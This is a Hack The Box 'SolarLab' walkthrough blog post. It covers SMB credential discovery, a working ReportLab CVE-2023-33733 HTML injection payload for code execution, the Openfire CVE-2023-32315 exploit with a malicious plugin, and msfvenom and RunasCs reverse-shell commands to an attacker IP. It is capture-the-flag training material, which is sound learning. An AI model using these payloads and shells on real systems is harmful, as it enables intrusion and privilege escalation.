<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: SolarLab</title>
<meta name=description content="Platform: Hack The Box Link: SolarLab Level: Medium OS: Windows SolarLab begins with a basic website that, after enumeration, offers no direct exploitation …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-solarlab/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: SolarLab"><meta property="og:description" content="Platform: Hack The Box Link: SolarLab Level: Medium OS: Windows SolarLab begins with a basic website that, after enumeration, offers no direct exploitation …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-SolarLab/SolarLab.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-SolarLab/SolarLab.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: SolarLab"><meta name=twitter:description content="Platform: Hack The Box Link: SolarLab Level: Medium OS: Windows SolarLab begins with a basic website that, after enumeration, offers no direct exploitation …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-solarlab/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-solarlab/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-SolarLab/SolarLab.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-solarlab/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-solarlab/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: SolarLab</h1><small role=doc-subtitle></small><p class=post-date>6 min read |
<span class=post-date>September 20, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/SolarLab>SolarLab</a></li><li>Level: Medium</li><li>OS: Windows</li></ul><hr><p>SolarLab begins with a basic website that, after enumeration, offers no direct exploitation paths. Shifting focus to SMB, we discover a document in a file share containing credentials. These credentials grant access to ReportHub, accessible at a subdomain found during previous enumeration. Upon examining its functionality, we identify that it generates PDFs using the vulnerable ReportLab library (<code>CVE-2023-33733</code>), which allows us to exploit this and gain initial access, recovering the user flag.</p><p>Further exploration reveals several internal services, including an Openfire admin console accessed via tunneling. Exploiting a known vulnerability in the Openfire version (<code>CVE-2023-32315</code>), we gain access to the admin console and escalate privileges by uploading a malicious plugin coupled with a reverse shell command. Finally, by decrypting credentials found in an Openfire file, we obtain an admin shell and recover the root flag.</p><p>Target IP address - <code>10.10.11.16</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/SolarLab -p- 10.10.11.16
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-09-20 13:32 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.16
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.052s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>65530</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE       VERSION
</span></span><span style=display:flex><span>80/tcp   open  http          nginx 1.24.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://solarlab.htb/
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.24.0
</span></span><span style=display:flex><span>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>445/tcp  open  microsoft-ds?
</span></span><span style=display:flex><span>6791/tcp open  http          nginx 1.24.0
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.24.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
</span></span><span style=display:flex><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-09-20T18:35:13
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 176.37 seconds
</span></span></code></pre></div><p>Ports discovered:</p><ul><li>80 - HTTP with Nginx 1.24.0 redirecting to <code>http://solarlab.htb/</code></li><li>135 - RPC</li><li>139 (NetBIOS) & 445 (SMB)</li><li>6791 - HTTP with nginx with a second redirection to <code>http://report.solarlab.htb:6791/</code></li></ul><p>We update the hosts file.</p><pre tabindex=0><code>sudo echo &#34;10.10.11.16 solarlab.htb report.solarlab.htb&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>The website features a messaging service that is supposed to be &ldquo;unhackable&rdquo;.</p><p><img src=/images/HTB-SolarLab/solarlab-website.png alt="SolarLab website"></p><p>The source code of the webpage doesn&rsquo;t reveal anything useful.</p><p>After enumerating SMB we find that we can read the <code>Documents</code> share.</p><pre tabindex=0><code>netexec smb 10.10.11.16 -u Guest -p &#34;&#34; --shares
</code></pre><p><img src=/images/HTB-SolarLab/smb_enum.png alt="SolarLab shares enumeration"></p><p>We use smbclient to access the share and find four files, two right after accessing the share and two additional files in the <code>concepts</code> directory:</p><ul><li><code>details-file.xlsx</code></li><li><code>old_leave_request_form.docx</code></li><li><code>Training-Request-Form.docx</code></li><li><code>Travel-Request-Sample.docx</code></li></ul><pre tabindex=0><code>smbclient //10.10.11.16/Documents -U Guest
</code></pre><p><img src=/images/HTB-SolarLab/share_files.png alt="SolarLab shares files"></p><p>We can download all the files with <code>get</code>.</p><p><img src=/images/HTB-SolarLab/files-downloads.png alt="SolarLab shares files download"></p><p>After examining each document we find some credentials in <code>details-file.xlsx</code>.</p><p><img src=/images/HTB-SolarLab/password-file.png alt="Credentials found"></p><p>So far the only way we can use those credentials is with SMB. It turns out that those credentials are valid but the available shares are still the same ones we could access with the guest account.</p><pre tabindex=0><code>netexec smb 10.10.11.16 -u KAlexander -p &#34;dkjafblkjadsfgl&#34;

netexec smb 10.10.11.16 -u blake -p &#34;ThisCanB3typedeasily1@&#34;

netexec smb 10.10.11.16 -u ClaudiaS -p &#34;dadsfawe9dafkn&#34;
</code></pre><p><img src=/images/HTB-SolarLab/smb_logins.png alt="SMB logins"></p><p>Moving on, directory enumeration is also unfruitful.</p><pre tabindex=0><code>gobuster dir -u http://solarlab.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre><p><img src=/images/HTB-SolarLab/gobuster.png alt="SolarLab directory bruteforcing"></p><p>Let&rsquo;s check the subdomain. When we go to <code>http://report.solarlab.htb:6791/</code> we find a login form for ReportHub.</p><p><img src=/images/HTB-SolarLab/reporthub_solarlab.png alt="SolarLab report subdomain"></p><p>The only credentials we have so far are the ones from the password file, after several tries we are able to login with <code>blakeb:ThisCanB3typedeasily1@</code>.</p><p><img src=/images/HTB-SolarLab/dashboard.png alt="SolarLab Dashboard"></p><p>We can choose which option we want, fill the form and get a pdf file. We can also upload an image for the signature (which might be a way to exploit the target).</p><p><img src=/images/HTB-SolarLab/Leave-Request-form.png alt="Leave request form"></p><p>Below is an example of the PDF generated.</p><p><img src=/images/HTB-SolarLab/pdf-generated.png alt="pdf generated"></p><h2 id=initial-foothold>Initial Foothold</h2><p>Using exiftool on the PDF generated we discover that it is produced by reportlab.</p><pre tabindex=0><code>exiftool output.pdf
</code></pre><p><img src=/images/HTB-SolarLab/output_pdf.png alt="exiftool results"></p><p>We find a PoC for Reportlab (<a href="https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0">CVE-2023-33733</a>) that leads to RCE <a href=https://github.com/c53elyas/CVE-2023-33733/tree/master>here</a>.</p><blockquote><p>I used the <code>Travel Approval</code> option here but you can make the exploit work with the other options.</p></blockquote><p><img src=/images/HTB-SolarLab/Travel_Approval.png alt="Travel Approval"></p><p>After catching the request and sending it to the repeater with Burp. We insert our payload and make sure to match the <code>filename</code> value with the one for <code>Content-Type</code>.</p><blockquote><p>We get a reverse shell from <a href=https://www.revshells.com/>revshells</a> using the option <code>PowerShell #3 (Base64)</code>.</p></blockquote><p><img src=/images/HTB-SolarLab/payload-RCE.png alt="ReportLab RCE"></p><p><strong>Payload used</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-HTML data-lang=HTML><span style=display:flex><span>&lt;<span style=color:#e06c75>para</span>&gt;&lt;<span style=color:#e06c75>font</span> <span style=color:#e06c75>color</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;[[[getattr(pow, Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;INSERT_REVSHELL_HERE&#39;) for Word in [ orgTypeFun( &#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: 1 == 0, &#39;__eq__&#39;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: { setattr(self, &#39;mutated&#39;, self.mutated - 1) }, &#39;__hash__&#39;: lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#39;red&#39;&#34;</span>&gt;
</span></span><span style=display:flex><span>                exploit
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>font</span>&gt;&lt;/<span style=color:#e06c75>para</span>&gt;
</span></span></code></pre></div><p>On our listener we get a shell as Blake and the user flag is found in the Desktop directory.</p><p><img src=/images/HTB-SolarLab/user_flag.png alt="User flag"></p><h3 id=shell-as-openfire>Shell as openfire</h3><p>There is a <code>openfire</code> user on the target.</p><p><img src=/images/HTB-SolarLab/users_list.png alt="User list"></p><p>With <code>netstat -ano</code> we check all the services running on the target. In order to access the internal services we use tunneling.</p><blockquote><p>I personally prefer <a href=https://github.com/nicocha30/ligolo-ng>ligolo-ng</a> but you can also use chisel.</p></blockquote><p><img src=/images/HTB-SolarLab/netstat.png alt="netstat command"></p><p>After trying various ports we find an Openfire Administration Console on port 9090.</p><p><img src=/images/HTB-SolarLab/Openfire-console.png alt="Openfire admin console"></p><p>None of the credentials we have so far are working. I remember this version of Openfire being vulnerable to <a href=https://vulncheck.com/blog/openfire-cve-2023-32315>CVE-2023-32315</a> with a PoC being available <a href=https://github.com/miko550/CVE-2023-32315>here</a>.</p><blockquote><p>This exploitation method was used for HTB: Jab, but we already had credentials back then</p></blockquote><ol><li>We login with the newly created account</li></ol><pre tabindex=0><code>python3 CVE-2023-32315.py -t http://240.0.0.1:9090
</code></pre><p><img src=/images/HTB-SolarLab/openfire-new-account.png alt="Openfire new account"></p><p>Once logged in we need to upload a malicious plugin in the <code>Plugin</code> section. The malicious plugin is the <code>openfire-management-tool-plugin.jar</code> file available in the PoC repository.</p><p><img src=/images/HTB-SolarLab/malicious-plugin.png alt="Openfire malicious plugin"></p><p>Go to <code>Server</code> &ndash;> <code>Server Settings</code> &ndash;> <code>Management Tool</code>, input the password <code>123</code> and click <code>Login</code>. You get some information about the server.</p><p>Select <code>system command</code> in the drop-down menu.</p><p><img src=/images/HTB-SolarLab/system_cmd.png alt="Openfire system command"></p><p>Get another Powershell base64 encoded reverse shell from <a href=https://www.revshells.com/>revshells</a> and execute it. On the listener we get a shell as <code>openfire</code>.</p><p><img src=/images/HTB-SolarLab/execute-cmd.png alt="Openfire execute command"></p><p><img src=/images/HTB-SolarLab/openfire_shell.png alt="Openfire shell"></p><h2 id=privilege-escation-admin-shell>Privilege Escation (admin shell)</h2><p>We still cannot find the root flag but after some system exploration we find a file called <code>openfire.script</code> in <code>C:\Program Files\Openfire\embedded-db</code>.</p><p>The file contains the credentials of the admin user but the password needs to be decrypted. Fortunately we have the password hash and the key.</p><p><img src=/images/HTB-SolarLab/encrypted-pwd.png alt="Openfire encrypted password"></p><ul><li>Password hash: <code>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></li><li>Key value: <code>hGXiFzsKaAeYLjn</code></li></ul><p>We can decrypt those with <a href=https://github.com/c0rdis/openfire_decrypt>openfire_decrypt</a> by using the command below.</p><pre tabindex=0><code>java OpenFireDecryptPass [PASSWORD_HASH] [KEY_VALUE]
</code></pre><p><img src=/images/HTB-SolarLab/java-openfire-decrypt.png alt="Openfire password decrytion"></p><p>The credentials are: <code>admin:ThisPasswordShouldDo!@</code>.</p><p>I tried to login with Evil-WinRM but it was not working so we resort to using RunasCs.</p><pre tabindex=0><code>msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT_NUMBER -f exe -a x64 --platform windows -o shell.exe
</code></pre><p>After sending both <code>shell.exe</code> and <code>RunasCs.exe</code> to the target, we run the command below.</p><blockquote><p>Setup a listener before running the runascs.exe command</p></blockquote><pre tabindex=0><code>.\runascs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.14.176:5555
</code></pre><p><img src=/images/HTB-SolarLab/runascs_root.png alt="runascs root command"></p><p>On our listener we get a shell as administrator and we find the root flag in the Desktop directory.</p><p><img src=/images/HTB-SolarLab/root_flag.png alt="root shell & root flag"></p></div><div class=prev-next><div class=prev-post><p><a href=/posts/thm-fridayovertime/>&#8592;
Previous:
THM: Friday Overtime</a></p><p class=prev-post-date>September 19, 2024</p></div><div class=next-post><p><a href=/posts/htb-boardlight/>Next:
HTB: BoardLight
&#8594;</a></p><p class=next-post-date>September 27, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#initial-foothold>Initial Foothold</a><ul><li><a href=#shell-as-openfire>Shell as openfire</a></li></ul></li><li><a href=#privilege-escation-admin-shell>Privilege Escation (admin shell)</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>